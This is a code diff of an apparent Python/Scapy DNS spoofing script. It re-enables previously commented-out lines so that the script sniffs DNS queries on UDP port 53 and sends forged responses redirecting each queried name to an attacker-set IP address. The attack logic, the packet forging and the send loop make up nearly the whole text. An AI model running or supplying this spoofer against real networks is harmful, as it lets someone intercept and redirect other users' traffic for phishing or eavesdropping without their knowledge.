@@ -16,9 +16,8 @@ Popen([firewall], shell=True, stdout=PIPE)
 
 def dnsspoof(recieved : IP):
     if recieved.haslayer(DNS) and recieved.getlayer(DNS).qr==0:
-        print("ok")
-        #spoof = (Ether()/ IP(dst=recieved[IP].src, src=recieved[IP].dst)/UDP(dport=recieved[UDP].sport, sport=recieved[UDP].dport)/DNS(id=recieved[DNS].id, qd=recieved[DNS].qd, qr=1,an=DNSRR(rrname=recieved[DNS].qd.qname, ttl=10, rdata=gotoIP) ))
-        #sendp(spoof, verbose=1)
+        spoof = (Ether()/ IP(dst=recieved[IP].src, src=recieved[IP].dst)/UDP(dport=recieved[UDP].sport, sport=recieved[UDP].dport)/DNS(id=recieved[DNS].id, qd=recieved[DNS].qd, qr=1,an=DNSRR(rrname=recieved[DNS].qd.qname, ttl=10, rdata=gotoIP) ))
+        sendp(spoof, verbose=1)
 
 while True:
     a = sniff(prn = dnsspoof,count=1, filter="udp port 53")
